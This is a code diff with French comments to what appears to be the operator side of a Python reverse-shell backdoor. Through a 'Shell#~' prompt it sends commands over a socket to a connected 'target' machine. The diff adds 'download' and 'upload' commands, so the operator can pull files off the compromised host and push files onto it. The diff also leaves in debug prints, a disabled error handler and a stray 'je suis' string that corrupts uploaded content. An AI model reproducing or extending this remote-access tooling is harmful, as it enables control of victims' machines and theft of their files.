@@ -4,7 +4,11 @@ import socket
 import json
 
 def reliable_send(data):
-    json_data = json.dumps(data)
+    if type(data) is not bytes:
+        json_data = json.dumps(data)
+    else:
+        json_data = json.dumps(data.decode('utf-8'))
+    print("envoi de -> {}".format(data))
     target.send(json_data.encode())
 
 
@@ -12,21 +16,46 @@ def reliable_recv():
     data = ""
     while True:
         try:
-            data = data + target.recv(1024).decode('utf-8')
+            data_recv = target.recv(1024).decode('utf-8')
+            print(data_recv)
+            data = data + data_recv
             return json.loads(data)
         except ValueError:
             continue
 
+def concatenateUploadMessageAndFileUploadContent(command, content):
+    return command + " | " + content + "je suis"
+
+
 def shell():
     while True:
         command = input("Shell#~{}:".format(ip))
+        print("command -> {}".format(command))
         if command == 'q':
-            reliable_send(command)
             s.close()
             break
         elif len(command) > 1 and command[:2] == "cd":
-            #ça veut dire qu'on veut changer de fichier donc il ne faut pas attendre de réponse
             reliable_send(command)
+            #ça veut dire qu'on veut changer de fichier donc il ne faut pas attendre de réponse
+            continue
+        elif len(command) > 1 and command[:8] == "download":
+            reliable_send(command)
+            # ici on va avoir la possibilité de download un file
+            with open(command[9:], "wb") as file:
+                file_data = reliable_recv()
+                print("file_data -> {}".format(file_data))
+                file.write(file_data.encode())
+        elif len(command) > 1 and command[:6] == "upload":
+            # pour la partie upload
+            print("je suis dans la partie upload")
+            #try:
+            with open(command[7:], "rb") as file:
+                command_file_content = concatenateUploadMessageAndFileUploadContent(command, file.read().decode('utf-8'))
+                print("file_content -> {}".format(command_file_content))
+                reliable_send(command_file_content)
+                print("apres l'envoi du content")
+            #except:
+            #    reliable_send("Faiiled to Upload")
         else:
             reliable_send(command)
             message = reliable_recv()
